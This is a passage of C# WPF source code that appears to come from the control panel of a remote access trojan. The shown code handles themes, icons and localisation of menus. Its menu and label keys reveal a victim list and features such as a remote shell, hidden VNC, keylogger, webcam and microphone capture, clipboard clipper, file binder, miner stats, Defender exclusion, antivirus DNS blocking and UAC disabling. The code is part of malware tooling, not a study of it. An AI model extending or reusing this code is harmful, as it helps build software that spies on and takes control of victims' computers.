            if (w is not ThemedWindow) w.FontFamily = themeFontFamily;
        }

        // DevExpress defers some chrome updates to Normal priority (DispatcherPriority = 9).
        // Render (7) and Background (4) have LOWER priority numbers, so they run AFTER Normal.
        // Two passes guarantee our brushes win over any DX deferred resource mutations:
        //   Pass 1 at Render priority  — catches most DX updates
        //   Pass 2 at Background priority — catches any remaining deferred DX chrome updates,
        //           then forces a layout pass so the ThemedWindow chrome re-renders immediately.
        Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Render, new Action(() =>
        {
            var wr = Resources;
            foreach (var k in allKeys)
                if (res.Contains(k)) wr[k] = res[k];
        }));
        var capturedAllKeys = allKeys;
        var capturedRes = res;
        Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Background, new Action(() =>
        {
            var wr = Resources;
            foreach (var k in capturedAllKeys)
                if (capturedRes.Contains(k)) wr[k] = capturedRes[k];

            this.InvalidateMeasure();
            this.UpdateLayout();
        }));

        UpdateLogBrushes(name);

        // Suppress DX chrome border on ALL open feature windows for legacy system themes.
        // SeroDark / modern themes: no action (each window handles its own chrome via DX).
        if (name is "WXI" or "WindowsXP" or "Basic")
        {
            Dispatcher.BeginInvoke(() =>
            {
                foreach (var w in Application.Current.Windows.OfType<System.Windows.Window>())
                {
                    if (w is ServerWindow) continue;
                    w.BorderBrush     = System.Windows.Media.Brushes.Transparent;
                    w.BorderThickness = new System.Windows.Thickness(0);
                }
            }, System.Windows.Threading.DispatcherPriority.ContextIdle);
        }

        // Hide accent palette for themes with a fixed accent (Seven Classic, Windows XP).
        if (AccentSection != null)
            AccentSection.Visibility = (name == "Seven" || name == "WindowsXP") ? Visibility.Collapsed : Visibility.Visible;    }

    private void ApplyStoredTheme()
    {
        var name = UiPrefs.GetString("Theme", "SeroDark");
        ApplyTheme(name);
        if (ThemeCurrentName != null) UpdateThemePickerButton(name);
    }

    // Predefined accent palette colours — same set as PureRAT-style pickers
    private static readonly (string Hex, string Label)[] _accentPalette =
    {
        ("#4A85F5", "Blue"),    ("#7C5CE8", "Violet"), ("#5E9CD3", "Steel"),
        ("#2B579A", "Navy"),    ("#22C55E", "Green"),  ("#2DD4BF", "Teal"),
        ("#06B6D4", "Cyan"),    ("#F59E0B", "Amber"),  ("#EF4444", "Red"),
        ("#EC4899", "Pink"),    ("#8B5CF6", "Purple"), ("#D4B500", "Gold"),
    };

    private void BuildAccentPalette()
    {
        if (AccentPalettePanel == null) return;
        AccentPalettePanel.Children.Clear();
        var savedHex = UiPrefs.GetString("CustomAccent", "");

        foreach (var (hex, label) in _accentPalette)
        {
            var clr = (System.Windows.Media.Color)System.Windows.Media.ColorConverter.ConvertFromString(hex);
            bool isSel = string.Equals(hex, savedHex, StringComparison.OrdinalIgnoreCase);

            var swatch = new Border
            {
                Width = 20, Height = 20,
                CornerRadius = new CornerRadius(10),
                Background  = new SolidColorBrush(clr),
                Margin  = new Thickness(0, 0, 4, 4),
                Cursor  = System.Windows.Input.Cursors.Hand,
                ToolTip = label,
                BorderThickness = new Thickness(isSel ? 2 : 0),
                BorderBrush = isSel ? Brushes.White : Brushes.Transparent,
            };
            swatch.Effect = new System.Windows.Media.Effects.DropShadowEffect
            {
                Color = clr, BlurRadius = 6, ShadowDepth = 0, Opacity = 0.5
            };

            var capturedHex = hex;
            swatch.MouseLeftButtonDown += (_, _2) =>
            {
                UiPrefs.Set("CustomAccent", capturedHex);
                var curTheme = UiPrefs.GetString("Theme", "SeroDark");
                ApplyTheme(curTheme);
                BuildAccentPalette(); // refresh selection ring
            };

            AccentPalettePanel.Children.Add(swatch);
        }
    }

    private void BtnResetAccent_Click(object sender, RoutedEventArgs e)
    {
        UiPrefs.Set("CustomAccent", "");
        UiPrefs.Set("Theme", "SeroDark");
        ApplyTheme("SeroDark");
        if (ThemeCurrentName != null) UpdateThemePickerButton("SeroDark");
        BuildAccentPalette();
    }

    private static FrameworkElement? TryMakeDxImage(string svgPath, int size)
    {
        try
        {
            var xaml = "<dx:DXImage xmlns:dx=\"http://schemas.devexpress.com/winfx/2008/xaml/core\" " +
                       $"Source=\"{{dx:DXImageExtension '{svgPath}'}}\" " +
                       $"Width=\"{size}\" Height=\"{size}\" " +
                       "HorizontalAlignment=\"Center\" VerticalAlignment=\"Center\"/>";
            return (FrameworkElement)System.Windows.Markup.XamlReader.Parse(xaml);
        }
        catch { return null; }
    }

    private void BuildThemeItems()
    {
        ThemeItemsPanel.Children.Clear();
        var search   = _themePickerSearch.ToLowerInvariant();
        var savedKey = UiPrefs.GetString("Theme", "SeroDark");
        string? lastCat = null;

        foreach (var t in _allThemes)
        {
            bool matches = string.IsNullOrEmpty(search)
                || t.DisplayName.ToLowerInvariant().Contains(search)
                || t.Category.ToLowerInvariant().Contains(search);
            if (!matches) continue;

            if (t.Category != lastCat)
            {
                ThemeItemsPanel.Children.Add(new TextBlock
                {
                    Text       = t.Category,
                    Foreground = Application.Current.Resources["LabelBrush"] as SolidColorBrush
                                 ?? new SolidColorBrush(Color.FromRgb(0x4A, 0x52, 0x80)),
                    FontSize   = 9, FontWeight = FontWeights.SemiBold,
                    Margin     = new Thickness(8, 6, 8, 2)
                });
                lastCat = t.Category;
            }

            ThemeItemsPanel.Children.Add(MakeThemeItem(t, savedKey));
        }
    }

    // Hex string → frozen SolidColorBrush (used by theme icon helpers)
    private static SolidColorBrush HexBrush(string hex)
    {
        var b = new SolidColorBrush((Color)System.Windows.Media.ColorConverter.ConvertFromString(hex));
        b.Freeze();
        return b;
    }

    // Colored square icon with text label centred inside
    private static Grid MakeLetterIcon(string text, string bgHex, string fgHex, double fontSize = 9.5)
    {
        var g = new Grid { Width = 22, Height = 22, Background = HexBrush(bgHex) };
        g.Children.Add(new TextBlock
        {
            Text = text, FontSize = fontSize, FontWeight = FontWeights.Bold,
            Foreground = HexBrush(fgHex),
            HorizontalAlignment = HorizontalAlignment.Center,
            VerticalAlignment   = VerticalAlignment.Center
        });
        return g;
    }

    // 4-quadrant Windows logo (red/green/blue/yellow)
    private static Grid MakeWindowsLogoIcon(string bgHex = "#FFFFFF")
    {
        var g = new Grid { Width = 22, Height = 22, Background = HexBrush(bgHex) };
        for (int r = 0; r < 3; r++)
            g.RowDefinitions.Add(new RowDefinition { Height = r == 1
                ? new GridLength(2) : new GridLength(1, GridUnitType.Star) });
        for (int c = 0; c < 3; c++)
            g.ColumnDefinitions.Add(new ColumnDefinition { Width = c == 1
                ? new GridLength(2) : new GridLength(1, GridUnitType.Star) });
        void Q(string hex, int row, int col)
        {
            var b = new Border { Background = HexBrush(hex) };
            Grid.SetRow(b, row); Grid.SetColumn(b, col); g.Children.Add(b);
        }
        Q("#F25022", 0, 0); Q("#7FBA00", 0, 2);
        Q("#00A4EF", 2, 0); Q("#FFB900", 2, 2);
        return g;
    }

    // Returns the 22×22 content shown inside the icon badge for a given theme
    private static FrameworkElement BuildThemeIconContent(ThemeEntry t)
    {
        // Real image icons for special themes
        if (t.Key is "SeroDark" or "Seven")
        {
            string uri = t.Key == "SeroDark"
                ? "pack://application:,,,/icone.png"
                : "pack://application:,,,/windows7.png";
            var img = new System.Windows.Controls.Image
            {
                Source  = new System.Windows.Media.Imaging.BitmapImage(new Uri(uri)),
                Stretch = System.Windows.Media.Stretch.UniformToFill,
                Width = 22, Height = 22
            };
            System.Windows.Media.RenderOptions.SetBitmapScalingMode(img,
                System.Windows.Media.BitmapScalingMode.HighQuality);
            return img;
        }
        // Windows 10/11 flag icon for WXI themes
        if (t.Key.StartsWith("WXI", StringComparison.Ordinal))
            return MakeWindowsLogoIcon("#F0F4FA");
        // Visual Studio badge
        if (t.Category is "VS")
        {
            return t.Key switch
            {
                "VS2017Blue"  => MakeLetterIcon("VS", "#5C2D91", "#FFFFFF"),
                "VS2017Dark"  => MakeLetterIcon("VS", "#1E1E1E", "#007ACC"),
                "VS2017Light" => MakeLetterIcon("VS", "#007ACC", "#FFFFFF"),
                "VS2010"      => MakeLetterIcon("VS", "#1F2231", "#5E9CD3"),
                _             => MakeLetterIcon("VS", "#5C2D91", "#FFFFFF"),
            };
        }
        // Office badge — "O" with version-appropriate colour
        if (t.Category.StartsWith("O.", StringComparison.Ordinal))
        {
            string bg = t.Key switch
            {
                _ when t.Key.Contains("Black") || t.Key.Contains("DarkGray") => "#1D1D1D",
                _ when t.Key.Contains("HighContrast")                        => "#000000",
                _ when t.Key.Contains("2010Silver")                          => "#8090A0",
                _ when t.Key.Contains("2010Black")                           => "#3A3A3A",
                _                                                             => "#D83B01",
            };
            string fg = bg is "#1D1D1D" or "#000000" or "#3A3A3A" ? "#D83B01" : "#FFFFFF";
            return MakeLetterIcon("O", bg, fg, 13);
        }
        // DevExpress badge
        if (t.Category is "DEFAULT")
        {
            return t.Key is "MetropolisDark"
                ? MakeLetterIcon("DX", "#1C2030", "#5588D8")
                : MakeLetterIcon("DX", "#3E6FA8", "#FFFFFF");
        }
        // Vector / Thematic remaining
        return t.Key switch
        {
            "TheBezier"  => MakeLetterIcon("B",  "#E07B39", "#FFFFFF", 11),
            "Basic"      => MakeLetterIcon("B",  "#5080B0", "#FFFFFF", 11),
            "WindowsXP"  => MakeLetterIcon("XP", "#1657CA", "#FFFFFF", 9),
            _            => MakeLetterIcon("?",  t.IconBar, "#FFFFFF"),
        };
    }

    private Border MakeThemeItem(ThemeEntry t, string savedKey)
    {
        var iconBorder = new Border
        {
            Width = 22, Height = 22, CornerRadius = new CornerRadius(4),
            ClipToBounds = true, VerticalAlignment = VerticalAlignment.Center,
            Margin = new Thickness(0, 0, 8, 0),
            Child = BuildThemeIconContent(t)
        };
        System.Windows.Media.Brush GetThemeRes(string key, Color fallback)
        {
            if (Application.Current.Resources[key] is System.Windows.Media.Brush b) return b;
            return new SolidColorBrush(fallback);
        }

        bool isSel = t.Key == savedKey;
        var nameBlock = new TextBlock
        {
            Text = t.DisplayName, FontSize = 12,
            Foreground = isSel
                ? GetThemeRes("NavSelTextBrush", Color.FromRgb(0xFF, 0xFF, 0xFF))
                : GetThemeRes("ContentTextBrush", Color.FromRgb(0xDD, 0xE0, 0xF0)),
            VerticalAlignment = VerticalAlignment.Center
        };
        var row = new StackPanel { Orientation = System.Windows.Controls.Orientation.Horizontal };
        row.Children.Add(iconBorder);
        row.Children.Add(nameBlock);

        var item = new Border
        {
            CornerRadius = new CornerRadius(4),
            Margin   = new Thickness(3, 1, 3, 1),
            Padding  = new Thickness(8, 5, 8, 5),
            Background = isSel
                ? GetThemeRes("NavSelBgBrush", Color.FromRgb(0x25, 0x2C, 0x60))
                : Brushes.Transparent,
            Cursor = System.Windows.Input.Cursors.Hand, Tag = t.Key, Child = row
        };

        string savedTheme = UiPrefs.GetString("Theme", "SeroDark");
        item.MouseEnter += (s, _) =>
        {
            if (s is Border brd && brd.Tag is string k && k != savedTheme)
            {
                brd.Background = GetThemeRes("NavHoverBgBrush", Color.FromRgb(0x1E, 0x28, 0x48));
                nameBlock.Foreground = GetThemeRes("NavHoverTextBrush", Color.FromRgb(0xDD, 0xE0, 0xF0));
            }
        };
        item.MouseLeave += (s, _) =>
        {
            if (s is Border brd && brd.Tag is string k)
            {
                if (k == savedTheme)
                {
                    brd.Background = GetThemeRes("NavSelBgBrush", Color.FromRgb(0x25, 0x2C, 0x60));
                    nameBlock.Foreground = GetThemeRes("NavSelTextBrush", Color.FromRgb(0xFF, 0xFF, 0xFF));
                }
                else
                {
                    brd.Background = Brushes.Transparent;
                    nameBlock.Foreground = GetThemeRes("ContentTextBrush", Color.FromRgb(0xDD, 0xE0, 0xF0));
                }
            }
        };
        item.MouseLeftButtonDown += (_, _2) =>
        {
            if (item.Tag is string k)
            {
                ApplyTheme(k);
                UiPrefs.Set("Theme", k);
                UpdateThemePickerButton(k);
                ThemePickerToggle.IsChecked = false;
                _themePickerSearch = "";
            }
        };

        return item;
    }

    private void ThemePickerPopup_Opened(object sender, EventArgs e)
    {
        ThemeSearchBox.Text = "";
        _themePickerSearch  = "";
        BuildThemeItems();
        Dispatcher.BeginInvoke(() => ThemeSearchBox.Focus());
    }

    private void ThemeSearchBox_TextChanged(object sender, TextChangedEventArgs e)
    {
        _themePickerSearch = ThemeSearchBox.Text;
        BuildThemeItems();
    }

    private void UpdateThemePickerButton(string key)
    {
        var t = _allThemes.FirstOrDefault(x => x.Key == key);
        if (t is null || ThemeCurrentName is null) return;
        ThemeCurrentName.Text = t.DisplayName;

        if (key is "SeroDark" or "Seven")
        {
            // Show image icon, hide rectangle preview
            string imgUri = key == "SeroDark"
                ? "pack://application:,,,/icone.png"
                : "pack://application:,,,/windows7.png";
            if (ThemeIconImage is not null)
            {
                ThemeIconImage.Source     = new System.Windows.Media.Imaging.BitmapImage(new Uri(imgUri));
                ThemeIconImage.Visibility = Visibility.Visible;
            }
            if (ThemeIconBg   is not null) ThemeIconBg.Visibility   = Visibility.Collapsed;
            if (ThemeIconBar  is not null) ThemeIconBar.Visibility  = Visibility.Collapsed;
            if (ThemeIconHost is not null) ThemeIconHost.Visibility = Visibility.Collapsed;
        }
        else
        {
            // Show the same icon as in the dropdown (letter badge / Windows flag)
            if (ThemeIconBg  is not null) ThemeIconBg.Visibility  = Visibility.Collapsed;
            if (ThemeIconBar is not null) ThemeIconBar.Visibility = Visibility.Collapsed;
            if (ThemeIconImage is not null && ThemeIconHost is not null)
            {
                ThemeIconImage.Visibility = Visibility.Collapsed;
                ThemeIconHost.Content    = BuildThemeIconContent(t);
                ThemeIconHost.Visibility = Visibility.Visible;
            }
        }
    }

    // ── Language ─────────────────────────────────────────────────────

    private void ApplyStoredLanguage()
    {
        var lang = UiPrefs.GetString("Language", "en");
        Lang.SetLanguage(lang);
        _langSyncing = true;
        for (int i = 0; i < SettingsLanguage.Items.Count; i++)
        {
            if (SettingsLanguage.Items[i] is System.Windows.Controls.ComboBoxItem item
                && item.Tag?.ToString() == lang)
            {
                SettingsLanguage.SelectedIndex = i;
                break;
            }
        }
        _langSyncing = false;
        ApplyLanguage();
    }

    private void ApplyLanguage()
    {
        // ── Sidebar section headers ──
        NavSectionMain.Text   = Lang.Get("NAV_MAIN");
        NavSectionTools.Text  = Lang.Get("NAV_TOOLS");
        NavSectionSystem.Text = Lang.Get("NAV_SYSTEM");

        // ── Nav buttons ──
        NavDashboard.Content   = Lang.Get("NAV_DASHBOARD");
        NavOnline.Content      = Lang.Get("NAV_ONLINE");
        NavAllClients.Content  = Lang.Get("NAV_ALL_CLIENTS");
        NavBuilder.Content     = Lang.Get("NAV_BUILDER");
        NavAutoTask.Content    = Lang.Get("NAV_AUTOTASK");
        NavScreen.Content      = Lang.Get("NAV_SCREEN");
        NavClipper.Content     = Lang.Get("NAV_CLIPPER");
        NavBinder.Content      = Lang.Get("NAV_BINDER");
        NavWinNotify.Content   = Lang.Get("NAV_WIN_NOTIFY");
        NavLogs.Content        = Lang.Get("NAV_LOGS");
        NavSettings.Content    = Lang.Get("NAV_SETTINGS");
        NavAbout.Content       = Lang.Get("NAV_ABOUT");

        // ── Window Notify ──
        if (WinNotifyEnabled    != null) WinNotifyEnabled.Content  = Lang.Get("WINNOTIFY_ENABLE");
        if (LblWinNotifyKeywords != null) LblWinNotifyKeywords.Text = Lang.Get("WINNOTIFY_KEYWORDS");
        if (WnTelegramEnabled   != null) WnTelegramEnabled.Content  = Lang.Get("WINNOTIFY_TG_ENABLE");
        if (LblWnTelegramToken  != null) LblWnTelegramToken.Text    = Lang.Get("WINNOTIFY_TG_TOKEN");
        if (LblWnTelegramChatId1 != null) LblWnTelegramChatId1.Text = Lang.Get("WINNOTIFY_TG_CHATID1");
        if (LblWnTelegramChatId2 != null) LblWnTelegramChatId2.Text = Lang.Get("WINNOTIFY_TG_CHATID2");
        if (LblWinNotifyLog       != null) LblWinNotifyLog.Text         = Lang.Get("WINNOTIFY_LOG_TITLE");
        if (BtnWinNotifyLogClear  != null) BtnWinNotifyLogClear.Content = Lang.Get("WINNOTIFY_LOG_CLEAR");
        if (ColWnTime    != null) ColWnTime.Header    = Lang.Get("WINNOTIFY_COL_TIME");
        if (ColWnUser    != null) ColWnUser.Header    = Lang.Get("WINNOTIFY_COL_USER");
        if (ColWnKeyword != null) ColWnKeyword.Header = Lang.Get("WINNOTIFY_COL_KEYWORD");
        if (ColWnConn    != null) ColWnConn.Header    = Lang.Get("WINNOTIFY_COL_CONN");
        if (ColWnWindow  != null) ColWnWindow.Header  = Lang.Get("WINNOTIFY_COL_WINDOW");

        // ── Settings section labels ──
        LblSettServer.Text      = Lang.Get("SETT_SERVER");
        LblSettNotif.Text       = Lang.Get("SETT_NOTIF");
        LblSettDiag.Text        = Lang.Get("SETT_DIAG");
        LblSettTheme.Text       = Lang.Get("SETT_THEME");
        LblSettLanguage.Text    = Lang.Get("SETT_LANGUAGE");
        LblSettAppearance.Text  = Lang.Get("SETT_APPEARANCE");
        LblSettPortChecker.Text = Lang.Get("SETT_PORT_CHECKER");

        // ── Dashboard labels ──
        if (DashLblOverview    != null) DashLblOverview.Text    = Lang.Get("DASH_OVERVIEW");
        if (DashLblOnline      != null) DashLblOnline.Text      = Lang.Get("DASH_ONLINE");
        if (DashSubOnline      != null) DashSubOnline.Text      = Lang.Get("DASH_SUB_ONLINE");
        if (DashLblTotal       != null) DashLblTotal.Text       = Lang.Get("DASH_TOTAL_SEEN");
        if (DashSubTotal       != null) DashSubTotal.Text       = Lang.Get("DASH_SUB_TOTAL");
        if (DashLblNew24h      != null) DashLblNew24h.Text      = Lang.Get("DASH_NEW_24H");
        if (DashSubNew24h      != null) DashSubNew24h.Text      = Lang.Get("DASH_SUB_NEW24H");
        if (DashLblUptime      != null) DashLblUptime.Text      = Lang.Get("DASH_UPTIME");
        if (DashSubUptime      != null) DashSubUptime.Text      = Lang.Get("DASH_SUB_UPTIME");
        if (DashLblConnChart   != null) DashLblConnChart.Text   = Lang.Get("DASH_CONN_CHART");
        if (DashPeakLbl        != null) DashPeakLbl.Text        = Lang.Get("DASH_PEAK") + " ";
        if (DashLblOsBreakdown != null) DashLblOsBreakdown.Text = Lang.Get("DASH_OS_BREAKDOWN");
        if (DashLblWebcam      != null) DashLblWebcam.Text      = Lang.Get("DASH_WEBCAM");
        if (DashSubWebcam      != null) DashSubWebcam.Text      = Lang.Get("DASH_SUB_WEBCAM");
        if (DashLblAdmin       != null) DashLblAdmin.Text       = Lang.Get("DASH_ADMIN");
        if (DashSubAdmin       != null) DashSubAdmin.Text       = Lang.Get("DASH_SUB_ADMIN");
        if (DashLblTagged      != null) DashLblTagged.Text      = Lang.Get("DASH_TAGGED");
        if (DashSubTagged      != null) DashSubTagged.Text      = Lang.Get("DASH_SUB_TAGGED");
        if (DashLblTopCountry  != null) DashLblTopCountry.Text  = Lang.Get("DASH_TOP_COUNTRY");
        if (DashSubTopCountry  != null) DashSubTopCountry.Text  = Lang.Get("DASH_SUB_TOP_COUNTRY");
        if (BtnDashMinerStatsLbl != null) BtnDashMinerStatsLbl.Text = Lang.Get("DASH_MINER_STATS");

        // ── Settings checkboxes ──
        if (SettingsDiscordRPC    != null) SettingsDiscordRPC.Content    = Lang.Get("SETT_CHK_DISCORD");
        if (SettingsNotifySound   != null) SettingsNotifySound.Content   = Lang.Get("SETT_CHK_NOTIFY_SOUND");
        if (SettingsNotifyVisual  != null) SettingsNotifyVisual.Content  = Lang.Get("SETT_CHK_NOTIFY_VISUAL");
        if (SettingsDevLogs       != null) SettingsDevLogs.Content       = Lang.Get("SETT_CHK_DEVLOGS");
        if (SettingsHideLogo      != null) SettingsHideLogo.Content      = Lang.Get("SETT_CHK_HIDE_LOGO");
        if (SettingsShowSeconds   != null) SettingsShowSeconds.Content   = Lang.Get("SETT_CHK_SHOW_SECONDS");
        if (SettingsBlockCapture  != null) SettingsBlockCapture.Content  = Lang.Get("SETT_CHK_BLOCK_CAPTURE");

        // ── DataGrid column headers — Online grid ──
        UpdateColHeader(GridClients, "USER",     Lang.Get("COL_USER"));
        if (ColOnlineIpHdr != null) ColOnlineIpHdr.Header = Lang.Get("COL_IP");
        UpdateColHeader(GridClients, "PRIV",     Lang.Get("COL_PRIV"));
        UpdateColHeader(GridClients, "COUNTRY",  Lang.Get("COL_COUNTRY"));
        UpdateColHeader(GridClients, "MACHINE",  Lang.Get("COL_MACHINE"));
        UpdateColHeader(GridClients, "OS",       Lang.Get("COL_OS"));
        UpdateColHeader(GridClients, "AV",       Lang.Get("COL_AV"));
        UpdateColHeader(GridClients, "1ST SEEN", Lang.Get("COL_1STSEEN"));
        UpdateColHeader(GridClients, "CPU",      Lang.Get("COL_CPU"));
        UpdateColHeader(GridClients, "GPU",      Lang.Get("COL_GPU"));
        UpdateColHeader(GridClients, "RAM",      Lang.Get("COL_RAM"));
        if (ColCamHdr    != null) ColCamHdr.Header    = Lang.Get("COL_CAM");
        UpdateColHeader(GridClients, "WINDOW",   Lang.Get("COL_WINDOW"));
        if (ColStatusHdr != null) ColStatusHdr.Header = Lang.Get("COL_STATUS");
        UpdateColHeader(GridClients, "LOAD", Lang.Get("COL_LOAD"));
        foreach (var c in _onlineClients) c.NotifyStatus();
        if (ColOnlinePingHdr != null) ColOnlinePingHdr.Header = Lang.Get("COL_PING");
        if (ColOnlineTagHdr != null) ColOnlineTagHdr.Header = Lang.Get("COL_TAG");
        UpdateColHeader(GridClients, "ID",       Lang.Get("COL_ID"));

        // ── DataGrid column headers — All Clients grid ──
        if (GridAllClients != null)
        {
            UpdateColHeader(GridAllClients, "USER",       Lang.Get("COL_USER"));
            if (ColAllClientsIpHdr != null) ColAllClientsIpHdr.Header = Lang.Get("COL_IP");
            UpdateColHeader(GridAllClients, "COUNTRY",    Lang.Get("COL_COUNTRY"));
            UpdateColHeader(GridAllClients, "MACHINE",    Lang.Get("COL_MACHINE"));
            UpdateColHeader(GridAllClients, "OS",         Lang.Get("COL_OS"));
            UpdateColHeader(GridAllClients, "AV",         Lang.Get("COL_AV"));
            UpdateColHeader(GridAllClients, "RAM",        Lang.Get("COL_RAM"));
            UpdateColHeader(GridAllClients, "FIRST SEEN", Lang.Get("COL_FIRST_SEEN"));
            UpdateColHeader(GridAllClients, "LAST SEEN",  Lang.Get("COL_LAST_SEEN"));
            UpdateColHeader(GridAllClients, "ID",         Lang.Get("COL_ID"));
            if (ColAllClientsTagHdr != null) ColAllClientsTagHdr.Header = Lang.Get("COL_TAG");
        }

        // ── DataGrid column headers — Binder grid ──
        if (BinderColIcon != null)      BinderColIcon.Header      = Lang.Get("BND_COL_ICON");
        if (BinderColFile != null)      BinderColFile.Header      = Lang.Get("BND_COL_FILE");
        if (BinderColSize != null)      BinderColSize.Header      = Lang.Get("BND_COL_SIZE");
        if (BinderColRunOnce != null)   BinderColRunOnce.Header   = Lang.Get("BND_COL_RUNONCE");

        // ── Binder context menu items ──
        if (BinderMenuRemove != null)   BinderMenuRemove.Header   = Lang.Get("BND_REMOVE");
        if (BinderMenuClearAll != null) BinderMenuClearAll.Header = Lang.Get("BND_CLEAR_ALL");
        if (BinderMenuUp != null)       BinderMenuUp.Header       = Lang.Get("BND_MOVE_UP");
        if (BinderMenuDown != null)     BinderMenuDown.Header     = Lang.Get("BND_MOVE_DOWN");

        // ── Binder toolbar buttons and labels ──
        if (BtnBinderAddTxt != null)        BtnBinderAddTxt.Text        = Lang.Get("BND_ADD");
        if (BtnBinderRemoveTxt != null)     BtnBinderRemoveTxt.Text     = Lang.Get("BND_REMOVE_BTN");
        if (BtnBinderClearAllTxt != null)   BtnBinderClearAllTxt.Text   = Lang.Get("BND_CLEAR_ALL");
        if (LblBinderIcon != null)          LblBinderIcon.Text          = Lang.Get("BND_ICON_LBL");
        if (BtnBinderSelectTxt != null)     BtnBinderSelectTxt.Text     = Lang.Get("BND_SELECT_ICON");

        // ── All Clients context menu ──
        if (RecMenuSetTag != null)      RecMenuSetTag.Header      = Lang.Get("REC_SET_TAG");
        if (RecMenuViewLogs != null)    RecMenuViewLogs.Header    = Lang.Get("REC_VIEW_LOGS");
        if (RecMenuCopyHwid != null)    RecMenuCopyHwid.Header    = Lang.Get("REC_COPY_HWID");

        // ── Context menu group headers ──
        if (MenuGrpAdmin      != null) MenuGrpAdmin.Header      = Lang.Get("FEAT_GRP_ADMIN");
        if (MenuGrpMonitoring != null) MenuGrpMonitoring.Header = Lang.Get("FEAT_GRP_MONITORING");
        if (MenuGrpMisc       != null) MenuGrpMisc.Header       = Lang.Get("FEAT_GRP_MISC");
        if (MenuGrpFun        != null) MenuGrpFun.Header        = Lang.Get("FEAT_GRP_FUN");
        if (MenuGrpClientMgmt != null) MenuGrpClientMgmt.Header = Lang.Get("FEAT_GRP_CLIENT");

        // ── Context menu Administration items ──
        if (MenuItemRemoteShell    != null) MenuItemRemoteShell.Header    = Lang.Get("FEAT_REMOTE_SHELL");
        if (MenuItemFileManager    != null) MenuItemFileManager.Header    = Lang.Get("FEAT_FILE_MANAGER");
        if (MenuItemProcessMgr     != null) MenuItemProcessMgr.Header     = Lang.Get("FEAT_PROCESS_MGR");
        if (MenuItemStartupMgr     != null) MenuItemStartupMgr.Header     = Lang.Get("FEAT_STARTUP_MGR");
        if (MenuItemTcpConn        != null) MenuItemTcpConn.Header        = Lang.Get("FEAT_TCP_CONN");
        if (MenuItemSvcMgr         != null) MenuItemSvcMgr.Header         = Lang.Get("FEAT_SERVICE_MGR");
        if (MenuItemWindowMgr      != null) MenuItemWindowMgr.Header      = Lang.Get("FEAT_WINDOW_MGR");
        if (MenuItemRegistryEditor != null) MenuItemRegistryEditor.Header = Lang.Get("FEAT_REGISTRY_EDITOR");
        if (MenuItemInstalledApps  != null) MenuItemInstalledApps.Header  = Lang.Get("FEAT_INSTALLED_APPS");
        if (MenuItemDeviceMgr      != null) MenuItemDeviceMgr.Header      = Lang.Get("FEAT_DEVICE_MGR");
        if (MenuItemSocks5         != null) MenuItemSocks5.Header         = Lang.Get("FEAT_SOCKS5");
        if (MenuItemRemoteExec     != null) MenuItemRemoteExec.Header     = Lang.Get("FEAT_REMOTE_EXEC");

        // ── Context menu Monitoring items ──
        if (MenuItemRemoteDesktop != null) MenuItemRemoteDesktop.Header = Lang.Get("FEAT_REMOTE_DESKTOP");
        if (MenuItemWebcam        != null) MenuItemWebcam.Header        = Lang.Get("FEAT_WEBCAM");
        if (MenuItemHvnc          != null) MenuItemHvnc.Header          = Lang.Get("FEAT_HVNC");
        if (MenuItemMicrophone    != null) MenuItemMicrophone.Header    = Lang.Get("FEAT_MICROPHONE");
        if (MenuItemKeylogger     != null) MenuItemKeylogger.Header     = Lang.Get("FEAT_KEYLOGGER");
        if (MenuItemPerfMonitor   != null) MenuItemPerfMonitor.Header   = Lang.Get("FEAT_PERF_MONITOR");

        // ── Context menu Miscellaneous items ──
        if (MenuItemExcludeDefender != null) MenuItemExcludeDefender.Header = Lang.Get("FEAT_EXCLUDE_DEFENDER");
        if (MenuItemBlockAvDns      != null) MenuItemBlockAvDns.Header      = Lang.Get("FEAT_BLOCK_AV_DNS");
        if (MenuItemBlockWSReset    != null) MenuItemBlockWSReset.Header    = Lang.Get("FEAT_BLOCK_WSRESET");
        if (MenuItemDisableUac      != null) MenuItemDisableUac.Header      = Lang.Get("FEAT_DISABLE_UAC");
        if (MenuItemBotKiller       != null) MenuItemBotKiller.Header       = Lang.Get("FEAT_BOT_KILLER");

        // ── Context menu Fun items ──
        if (MenuItemFunPanel  != null) MenuItemFunPanel.Header  = Lang.Get("FEAT_FUN_PANEL");
        if (MenuItemTikTokBot != null) MenuItemTikTokBot.Header = Lang.Get("FEAT_TIKTOK_BOT");

        // ── Context menu Client Management items ──
        if (MenuItemUacElevation != null) MenuItemUacElevation.Header = Lang.Get("FEAT_UAC_ELEVATION");
        if (MenuItemLoopUac      != null) MenuItemLoopUac.Header      = Lang.Get("FEAT_LOOP_UAC");
        if (MenuItemUpdateClient != null) MenuItemUpdateClient.Header = Lang.Get("FEAT_UPDATE_CLIENT");
        if (MenuItemDisconnect   != null) MenuItemDisconnect.Header   = Lang.Get("FEAT_DISCONNECT");
        if (MenuItemUninstall    != null) MenuItemUninstall.Header    = Lang.Get("FEAT_UNINSTALL");
        if (MenuItemSetTag       != null) MenuItemSetTag.Header       = Lang.Get("FEAT_SET_TAG");
        if (MenuItemViewLogs     != null) MenuItemViewLogs.Header     = Lang.Get("FEAT_VIEW_LOGS");
        if (MenuItemCopyIP       != null) MenuItemCopyIP.Header       = Lang.Get("FEAT_COPY_IP");

        // ── About section feature list ──
        if (AboutFeatRemoteShell   != null) AboutFeatRemoteShell.Text   = Lang.Get("FEAT_REMOTE_SHELL");
        if (AboutFeatRemoteDesktop != null) AboutFeatRemoteDesktop.Text = Lang.Get("FEAT_REMOTE_DESKTOP");
        if (AboutFeatRemoteWebcam  != null) AboutFeatRemoteWebcam.Text  = Lang.Get("FEAT_REMOTE_WEBCAM");
        if (AboutFeatFileExec      != null) AboutFeatFileExec.Text      = Lang.Get("FEAT_FILE_EXEC");
        if (AboutFeatUpdateClient  != null) AboutFeatUpdateClient.Text  = Lang.Get("FEAT_UPDATE_CLIENT");
        if (AboutFeatUninstall     != null) AboutFeatUninstall.Text     = Lang.Get("FEAT_UNINSTALL");
        if (AboutFeatUacElevation  != null) AboutFeatUacElevation.Text  = Lang.Get("FEAT_UAC_ELEVATION");
        if (AboutFeatAutoTask      != null) AboutFeatAutoTask.Text      = Lang.Get("FEAT_AUTOTASK");
        if (AboutFeatAndMore       != null) AboutFeatAndMore.Text       = Lang.Get("FEAT_AND_MORE");

        // ── Settings description texts ──
        if (LblSettMaxClients   != null) LblSettMaxClients.Text   = Lang.Get("SETT_MAX_CLIENTS");
        if (LblSettIntegrations != null) LblSettIntegrations.Text = Lang.Get("SETT_INTEGRATIONS");
